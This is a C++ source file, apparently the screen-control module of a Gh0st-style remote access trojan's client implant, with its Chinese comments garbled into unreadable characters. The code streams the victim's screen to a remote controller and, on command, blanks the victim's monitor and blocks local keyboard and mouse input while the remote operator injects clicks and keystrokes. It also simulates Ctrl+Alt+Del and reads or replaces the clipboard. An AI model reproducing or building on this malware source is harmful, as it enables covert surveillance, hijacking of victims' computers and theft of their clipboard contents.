#include "ScreenManager.h"



CScreenManager::CScreenManager(CClientSocket *pClient) :CManager(pClient)
{
	m_bAlgorithm = ALGORITHM_SCAN;            //��Ļɨ���㷨
	m_biBitCount = 8;
	m_pScreenSpy = new CScreenSpy(8);          //CScreenSpy��
	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_bIsCaptureLayer = false;
	//������������ ���������Ǿ�֪��ControlThread�������ض˶Է���˵Ŀ���
	//������ǳ���� �ȿ�һ��ControlThread�Ĺ���ת���������

	//���ŷ���WorkThread����
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
	m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL, true);
}


CScreenManager::~CScreenManager()
{
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
}


DWORD  CScreenManager::ControlThread(LPVOID lparam)
{
	// TODO: �ڴ˴����ʵ�ִ���.
	static	bool bIsScreenBlanked = false;
	CScreenManager *pThis = (CScreenManager *)lparam;
	while (pThis->IsConnect())
	{
		// �ӿ췴Ӧ�ٶ�
		for (int i = 0; i < 100; i++)
		{
			if (pThis->IsConnect())
			{
				// �ֱ��ʴ�С�ı���
				if (pThis->IsMetricsChange())
					pThis->ResetScreen(pThis->GetCurrentPixelBits());
				Sleep(10);
			}
			else
				break;
		}
		if (pThis->m_bIsBlankScreen)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
		}
		else
		{
			if (bIsScreenBlanked)
			{
				SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
				SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
				bIsScreenBlanked = false;
			}
		}
		BlockInput(pThis->m_bIsBlockInput);

		// �ֱ��ʴ�С�ı���
		if (pThis->IsMetricsChange())
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
	}

	BlockInput(false);

	//�������ֻ�����ڴ������˺����� ���Ƿ��ع��캯��
	return -1;
}


bool CScreenManager::IsConnect()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	return m_pClient->IsRunning();
}


bool CScreenManager::IsMetricsChange()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	LPBITMAPINFO	lpbmi = m_pScreenSpy->getBI();

	return (lpbmi->bmiHeader.biWidth != ::GetSystemMetrics(SM_CXSCREEN)) ||
		(lpbmi->bmiHeader.biHeight != ::GetSystemMetrics(SM_CYSCREEN));
}


void CScreenManager::ResetScreen(int biBitCount)
{
	// TODO: �ڴ˴����ʵ�ִ���.
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);

	delete m_pScreenSpy;

	if (biBitCount == 3)		// 4λ�Ҷ�
		m_pScreenSpy = new CScreenSpy(4, true);
	else if (biBitCount == 7)	// 8λ�Ҷ�
		m_pScreenSpy = new CScreenSpy(8, true);
	else
		m_pScreenSpy = new CScreenSpy(biBitCount);

	m_pScreenSpy->setAlgorithm(m_bAlgorithm);
	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);

	m_biBitCount = biBitCount;

	m_bIsWorking = true;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}


int CScreenManager::GetCurrentPixelBits()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	return m_biBitCount;
}




DWORD  CScreenManager::WorkThread(LPVOID lparam)
{
	// TODO: �ڴ˴����ʵ�ִ���.

	CScreenManager *pThis = (CScreenManager *)lparam;

	pThis->sendBITMAPINFO();         //����bmpλͼ�ṹ
	// �ȿ��ƶ˶Ի����

	pThis->WaitForDialogOpen();       //�ȴ����ض˵Ļ�Ӧ

	pThis->sendFirstScreen();         //���͵�һ֡������
	try // ���ƶ˹ر�ʱ�����
	{
		while (pThis->m_bIsWorking)
				pThis->sendNextScreen();      //Ȼ��������ͽ�����������
	}
	catch (...) {};

	//����ȥ�������Ҳ�ܼ򵥣����Ĺ���������sendBITMAPINFO,sendFirstScreen,sendNextScreen
	//����Ҫ���������������ͱ����˽�һ����CScreenSpy
	//�鿴sendBITMAPINFO�����Ķ���֤����һ��
	return 0;
}


void CScreenManager::sendBITMAPINFO()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	//�ղŸ���ҿ�����m_pScreenSpy��������Ķ������CScreenSpy��
	//����õ�bmp�ṹ�Ĵ�С
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_BITMAPINFO;
	//���ｫbmpλͼ�ṹ���ͳ�ȥ
	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	VirtualFree(lpBuffer, 0, MEM_RELEASE);
}


void CScreenManager::sendFirstScreen()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	//�������Ҳû��ʲô�ر�ľ��Ǵ�CScreenSpy��getFirstScreen�����еõ�ͼ������
	//Ȼ����getFirstImageSize�õ����ݵĴ�СȻ���ͳ�ȥ�����ǵ�getFirstScreen
	//�Ķ���
	BOOL	bRet = false;
	LPVOID	lpFirstScreen = NULL;

	lpFirstScreen = m_pScreenSpy->getFirstScreen();
	if (lpFirstScreen == NULL)
		return;

	DWORD	dwBytesLength = 1 + m_pScreenSpy->getFirstImageSize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;

	lpBuffer[0] = TOKEN_FIRSTSCREEN;
	memcpy(lpBuffer + 1, lpFirstScreen, dwBytesLength - 1);

	Send(lpBuffer, dwBytesLength);
	delete[] lpBuffer;
}


void CScreenManager::sendNextScreen()
{
	//����������ɺܼ�� �õ����ݣ��õ����ݴ�С��Ȼ����
	//���ǵ�getNextScreen�����Ķ��� 
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);

	if (dwBytes == 0 || !lpNetScreen)
		return;

	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;

	lpBuffer[0] = TOKEN_NEXTSCREEN;
	memcpy(lpBuffer + 1, (const char *)lpNetScreen, dwBytes);


	Send(lpBuffer, dwBytesLength);

	delete[] lpBuffer;
}





void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
		switch (lpBuffer[0])
		{
		case COMMAND_NEXT:
			// ֪ͨ�ں�Զ�̿��ƶ˶Ի����Ѵ򿪣�WaitForDialogOpen���Է���
			NotifyDialogIsOpen();
			break;
		case COMMAND_SCREEN_RESET:
			ResetScreen(*(LPBYTE)&lpBuffer[1]);
			break;
		case COMMAND_ALGORITHM_RESET:
			m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setAlgorithm(m_bAlgorithm);
			break;
		case COMMAND_SCREEN_CTRL_ALT_DEL:
			::SimulateCtrlAltDel();
			break;
		case COMMAND_SCREEN_CONTROL:
		{
			// Զ����Ȼ���Բ���
			BlockInput(false);
			ProcessCommand(lpBuffer + 1, nSize - 1);
			BlockInput(m_bIsBlockInput);
		}
		break;
		case COMMAND_SCREEN_BLOCK_INPUT: //ControlThread������
			m_bIsBlockInput = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_BLANK:
			m_bIsBlankScreen = *(LPBYTE)&lpBuffer[1];
			break;
		case COMMAND_SCREEN_CAPTURE_LAYER:
			m_bIsCaptureLayer = *(LPBYTE)&lpBuffer[1];
			m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
			break;
		case COMMAND_SCREEN_GET_CLIPBOARD:
			SendLocalClipboard();
			break;
		case COMMAND_SCREEN_SET_CLIPBOARD:
			UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
			break;
		case COMMAND_SCREEN_DISCONNECT:
			break;
		default:
			break;
		}
	}
	catch (...) {}
}

void CScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}

void CScreenManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{
	// ���ݰ����Ϸ�
	if (nSize % sizeof(MSG) != 0)
		return;

	SwitchInputDesktop();

	// �������
	int	nCount = nSize / sizeof(MSG);

	// ����������
	for (int i = 0; i < nCount; i++)
	{
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		switch (pMsg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
		{
			POINT point;
			point.x = LOWORD(pMsg->lParam);
			point.y = HIWORD(pMsg->lParam);
			SetCursorPos(point.x, point.y);
			SetCapture(WindowFromPoint(point));
		}
		break;
		default:
			break;
		}

		switch (pMsg->message)
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL, 0, 0, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}

void CScreenManager::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}
